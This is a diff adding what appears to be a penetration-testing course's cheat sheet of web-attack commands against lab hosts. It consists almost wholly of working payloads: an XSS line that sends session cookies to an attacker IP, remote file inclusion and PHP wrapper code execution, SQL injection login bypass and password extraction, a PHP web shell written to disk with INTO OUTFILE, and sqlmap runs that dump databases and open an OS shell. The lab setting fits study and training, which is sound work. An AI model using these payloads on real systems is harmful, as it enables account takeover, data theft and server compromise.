@@ -1,0 +1,115 @@
+Inspecting Sitemaps
+
+curl https://www.google.com/robots.txt
+ 
+ 
+DIRB 
+ 
+dirb http://www.megacorpone.com -r -z 10
+ 
+Burp Suite
+ 
+burpsuite
+ 
+ 
+Nikto 
+ 
+nikto -host=http://www.megacorpone.com -maxtime=30s
+ 
+ 
+Content Injection 
+ 
+sudo nc -nvlp 80
+ 
+Stealing Cookies and Session Information
+ 
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+powershell -ExecutionPolicy Bypass -File admin_login.ps1
+sudo nc -nvlp 80
+ 
+ 
+Contaminating Log Files
+ 
+powershell -ExecutionPolicy Bypass -File clear_logs.ps1
+nc -nv 10.11.0.22 80
+ 
+ 
+Remote File Inclusion (RFI) 
+ 
+sudo nc -nvlp 80
+cat evil.txt
+sudo systemctl restart apache2
+ 
+ 
+Expanding Your Repertoire
+ 
+python -m SimpleHTTPServer 7331
+python3 -m http.server 7331
+php -S 0.0.0.0:8000
+ruby -run -e httpd . -p 9000
+busybox httpd -f -p 10000
+ 
+ 
+ PHP Wrappers
+ 
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+ 
+ 
+ Identifying SQL Injection Vulnerabilities
+ 
+$query = "select * from users where username = '$user' and password = '$pass'"; 
+$query = "select * from users where username = 'Tom' and password = 'password123'"; 
+$query = "select * from users where username =''' and password = 'password123' "; 
+
+
+Authentication Bypass 
+
+select * from users where name = 'tom' and password = 'jones'; 
+select * from users where name = 'tom' or 1=1;#' and password = 'jones'; 
+select * from users where name = 'tom' or 1=1;
+select * from users where name = 'tom' or 1=1 LIMIT 1;# 
+mysql -u root -proot
+use webappdb;
+select * from users; 
+
+
+Enumerating the Database 
+
+$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
+
+
+Column Number Enumeration 
+order by 1
+
+Understanding the Layout of the Output 
+union all select 1, 2, 3
+
+
+Extracting Data from the Database 
+
+union all select 1, 2, @@version
+union all select 1, 2, user()
+union all select 1, 2, table_name from information_schema.tables
+union all select 1, 2, column_name from information_schema.columns where table_name='users'
+union all select 1, username, password from users
+ 
+ 
+ 
+From SQL Injection to Code Execution 
+
+union all select 1, 2,load_file('C:/Windows/System32/drivers/etc/hosts')
+union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+ 
+ 
+Automating SQL Injection
+
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --osshell
+ipconfig
+  
+Extra Miles 
+
+java -jar gadgets-1.0.0.jar
+   
